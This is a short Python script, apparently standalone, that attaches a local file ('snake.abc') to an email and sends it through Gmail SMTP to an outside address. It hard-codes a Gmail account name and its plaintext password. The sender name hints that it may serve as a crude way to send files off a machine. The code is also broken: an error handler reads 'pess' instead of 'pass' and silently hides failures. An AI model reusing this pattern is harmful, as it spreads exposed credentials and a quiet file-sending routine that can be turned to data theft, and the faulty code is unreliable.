from smtplib import SMTP_SSL
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

filepath = "snake.abc"
basename = os.path.basename(filepath)
address = "hackbancry@gmail.com"
password = "silvercrown1"
addressto = "nikokusha@gmail.com"
        # Compose attachment
part = MIMEBase('application', "octet-stream")
part.set_payload(open(filepath, "rb").read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', 'attachment; filename="%s"' % basename)

        # Compose message
msg = MIMEMultipart()
msg['From'] = address
msg['To'] = addressto
msg.attach(part)

try:
    smtp = SMTP_SSL()
    smtp.connect('smtp.gmail.com')
    smtp.login(address, password)
    smtp.sendmail(address, addressto, msg.as_string())
    smtp.quit()
except:
        pess
